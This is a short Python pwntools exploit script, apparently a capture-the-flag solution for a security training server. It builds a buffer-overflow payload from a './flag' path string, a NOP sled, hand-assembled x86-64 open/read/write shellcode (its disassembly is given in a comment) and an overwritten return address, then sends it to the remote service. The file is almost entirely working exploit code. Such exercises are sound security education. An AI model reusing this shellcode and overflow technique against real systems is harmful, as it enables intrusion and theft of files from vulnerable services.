from pwn import *
import time
#context.terminal = ['tmux', 'splitw', '-h']

'''

PER QUALCHE MOTIVO IGNOTO NON FUNZIONA PIU, PROBABILMENTE HO TOCCATO QUALCOSA DIO CAN
RIFARE CON LO STESSO MODO DI SERVER, TANTO È UGUALE

context.terminal = ['gnome-terminal', '-e']
r = process("./shellcode")
gdb.attach(r, """
	c
	""")
'''
r = remote("training.jinblack.it", 2006)

#input("wait")
#print(r.recvuntil("name?\n"))

buffer = 0x4040c0
buffer_jump = 0x4040d0
'''
OPEN
mov    rax,0x2
mov    rdi,0x4040c0
xor    rsi,rsi
xor    rdx,rdx
syscall 

READ
mov    rdi,rax
xor    rax,rax
mov    rsi,0x4040c0
mov    rdx,0x100
syscall 

WRITE
mov rax, 0x1
mov rdi, 0x1
mov rsi, 0x4040c0
mov rdx, 0x30
syscall
'''

#read_path = b"\x48\x31\xC0\x48\x31\xFF\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x40\x00\x00\x00\x0F\x05"

#open_sh = b"\xcc\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x0F\x05"
open_sh = b"\x48\xC7\xC0\x02\x00\x00\x00\x48\xC7\xC7\xC0\x40\x40\x00\x48\x31\xF6\x48\x31\xD2\x0F\x05"
read_sh = b"\x48\x89\xC7\x48\x31\xC0\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x00\x01\x00\x00\x0F\x05"
write_sh = b"\x48\xC7\xC0\x01\x00\x00\x00\x48\xC7\xC7\x01\x00\x00\x00\x48\xC7\xC6\xC0\x40\x40\x00\x48\xC7\xC2\x30\x00\x00\x00\x0F\x05"
#shellcode = read_sh
shellcode = b"./flag\x00\x00"
shellcode = shellcode.ljust(942, b"\x90")
shellcode = shellcode + open_sh + read_sh + write_sh



shellcode = shellcode + p64(buffer_jump)
payload = shellcode


r.send(payload)

r.interactive()
